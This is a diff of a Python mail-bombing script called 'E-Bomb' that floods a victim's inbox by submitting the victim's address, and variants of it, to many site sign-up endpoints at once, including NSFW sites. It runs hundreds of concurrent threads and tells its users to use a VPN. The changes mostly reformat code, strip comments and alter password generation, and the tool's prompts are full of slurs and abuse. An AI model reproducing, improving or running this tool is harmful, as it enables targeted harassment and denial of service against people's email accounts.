@@ -1,41 +1,34 @@
 # ███╗   ██╗ ██████╗ ████████╗███████╗███████╗    ██╗  ██╗    ███╗   ███╗ █████╗ ██╗  ██╗
 # ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝██╔════╝    ██║  ██║    ████╗ ████║██╔══██╗╚██╗██╔╝
-# ██╔██╗ ██║██║   ██║   ██║   █████╗  ███████╗    ███████║    ██╔████╔██║███████║ ╚███╔╝ 
-# ██║╚██╗██║██║   ██║   ██║   ██╔══╝  ╚════██║    ╚════██║    ██║╚██╔╝██║██╔══██║ ██╔██╗ 
+# ██╔██╗ ██║██║   ██║   ██║   █████╗  ███████╗    ███████║    ██╔████╔██║███████║ ╚███╔╝
+# ██║╚██╗██║██║   ██║   ██║   ██╔══╝  ╚════██║    ╚════██║    ██║╚██╔╝██║██╔══██║ ██╔██╗
 # ██║ ╚████║╚██████╔╝   ██║   ███████╗███████║         ██║    ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
 # ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝         ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
 # What Ive Worked On:
 # Added optional discord webhook logging. i am gonna improve some shit to it to make it actually worth using
 
-# Email lists they work on:
-# mail.tm
-# mail.gw
-# temp-mail.io
-# tempmailo.com
-# gmail.com
-# protonmail.com
-# outlook.com
-
 import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle, fade, sys, colorama, threading, requests
-from pystyle import Colors, Colorate, Center
-from colorama import Fore, Style, init
+from pystyle import Center
+from colorama import Fore, Style
 
-# need to move this configuration to an external config.json file
 size = 600  # Threads + Process / Iteration
 cap = None  # thread limit / set to None for unlimited. Only go higher than 500 is u got a fucking beast of a pc CPU wise.
 random_threads = True  # True = Threads Random. False = They Arent Random
 include_nsfw_sites = True  # True = Include NSFW sites. False = No NSFW sites
 timeout = aiohttp.ClientTimeout(total=20)
 
-# Optional Webhook Logging: 
+# Optional Webhook Logging Below:
 # WEBHOOK_URL = ""
 # response = requests.post(WEBHOOK_URL, json=data)
+
 
 def restart_main():
     asyncio.run(main())
 
+
 def clear_console():
     os.system("cls" if os.name == "nt" else "clear")
+
 
 def update_title():
     while True:
@@ -47,33 +40,23 @@ def update_title():
         os.system(f"title {title}" if os.name == "nt" else f"\033]0;{title}\007")
         time.sleep(0.1)
 
+
 def info():
     embed = {
         "title": "E-Bomb Executed",
         "description": "Webhook Is Working! Logs Will Be Sent Here",
-        "color": 0x00ff00,  # Green color
+        "color": 0x00FF00,  # Green color
         "fields": [
-            {
-                "name": "Status",
-                "value": "Success",
-                "inline": True
-            },
-            {
-                "name": "Execution Time",
-                "value": "Program Is Working",
-                "inline": True
-            }
+            {"name": "Status", "value": "Success", "inline": True},
+            {"name": "Execution Time", "value": "Program Is Working", "inline": True},
         ],
-        "footer": {
-            "text": "https://github.com/disbuted/Email-Spammer"
-        }
+        "footer": {"text": "https://github.com/disbuted/Email-Spammer"},
     }
 
-    data = {
-        "embeds": [embed]
-    }
+    data = {"embeds": [embed]}
 
     # skidded from chatgpt
+    
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
@@ -120,7 +103,9 @@ def clamp(value, min_value, max_value):
 def divide():
     print("-" * 40)
 
+
 progress = 0
+
 
 def update_progress():
     global progress
@@ -230,27 +215,24 @@ async def fetch(
 
 
 text = """   
-                        ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
-                        ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
-                        ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
-                        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
-                        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
-                        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
-                                                                    t.me/influenceable
-                                                                      pls use a vpn :)
+                        ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
+                        ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+                        █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
+                        ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+                        ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+                        ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
+                                                      t.me/influenceable
+                                                        pls use a vpn :)
 """
 
-# refer to here if u wann change the color :3
-# https://github.com/venaxyt/fade
-
 faded_text = fade.purpleblue(text)
-
 yellow_dash = f"{Fore.YELLOW}-{Style.RESET_ALL}"
 red_dash = f"{Fore.RED}-{Style.RESET_ALL}"
 green_dash = f"{Fore.GREEN}-{Style.RESET_ALL}"
 
+
 async def main():
-    threading.Thread(target=update_title, daemon=True).start()  # gives errors on linux
+    threading.Thread(target=update_title, daemon=True).start()
     clear_console()
     print(Center.XCenter(faded_text))
     try:
@@ -260,7 +242,6 @@ async def main():
                 with open(os.path.join(directory, "functions.json"), "r") as file:
                     functions = json.load(file)
             except Exception:
-                # no functions.json found in the directory, gonna load via async session.get
                 print(f"\r[{red_dash}] No Data Found, Refering To Backup Data")
                 time.sleep(0.5)
                 clear_console()
@@ -273,7 +254,6 @@ async def main():
                     functions = json.loads(await resp.text())
                     clear_console()
                     print(Center.XCenter(faded_text))
-                    # Connection successful! If error, will go to error string and close
                     print(
                         f"\r[{green_dash}] Backup Valid! Program Should Be Working Now."
                     )
@@ -293,11 +273,15 @@ async def main():
             }
             global progress, total, password, threads
             password = ""
-            # randomising password or something idfk
-            samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
+            samples = [
+                string.ascii_lowercase,
+                string.ascii_uppercase,
+                string.digits,
+                "!@#$%^&*()_+-=[]{}|;:',.<>?/`~",
+            ]
             for _ in samples:
                 password += "".join(random.sample(_, k=5))
-            password = "!" + "".join(random.sample(password, k=len(password)))
+                password = "!" + "".join(random.sample(password, k=len(password)))
 
             email = None
             while True:
@@ -310,7 +294,6 @@ async def main():
                     break
                 clear_console()
                 print(Center.XCenter(faded_text))
-                # invalid email or the user is just slow :d
                 print(f"\r[{red_dash}] That isnt a fucking email address you retard")
                 print(f"\r[{green_dash}] Lets try that again :)")
                 time.sleep(2)
@@ -333,18 +316,16 @@ async def main():
                 except Exception:
                     clear_console()
                     print(Center.XCenter(faded_text))
-                    # Amount of threads needed, not a word, just numbers :3
                     print(
                         f"\r[{red_dash}] Are you fucking retarded? That is not a number 🤬🤬"
                     )
                     print(f"\r[{green_dash}] Lets try that again :)")
                     time.sleep(2)
-                    await main()  # removed sys exit function :)
+                    await main()
 
             variants = random.sample(variants, k=threads)
             total = len(functions) * len(variants)
             divide()
-            # Debug info
             print(f"\r[{green_dash}] Useless Infomation Here:")
             global debug
             debug = threads == 1
@@ -371,7 +352,6 @@ async def main():
                     total = 1
                     functions = dict([next(reversed(functions.items()))])
             else:
-                # Testing endpoints, need to ask max for more soon or the tutorial on how to get valid ones :(
                 print(
                     f"\r[{green_dash}] Pretesting endpoints to grant 2 minutes of life ♥ ♥ ♥"
                 )
@@ -406,7 +386,6 @@ async def main():
             ]
             if random_threads == True:
                 queue = random.sample(queue, k=len(queue))
-                # All went successful and is not running the process
             print(f"\r[{green_dash}] Sending Emails!")
             for j in range(0, len(queue), size):
                 tasks = [
@@ -426,7 +405,7 @@ async def main():
                 f"\r[{yellow_dash}] Remember that some emails will arrive late or never"
             )
             async with session.get(
-                "https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json"  # Valid working CDN as of 11/11/2024
+                "https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json"
             ) as resp:
                 words = ", ".join(random.sample(await resp.json(), k=5))
             prefix = "an" if words[0] in "aeiou" else "a"
@@ -447,7 +426,6 @@ async def main():
             sys.exit()
     except Exception as error:
         print(error)
-        # Program died due to an error :(
         print(
             f"\r[{red_dash}] It seems like the program has died before pope francis :(( womp womp"
         )
@@ -462,4 +440,3 @@ if __name__ == "__main__":
         pass
     info()
     asyncio.run(main())
-    
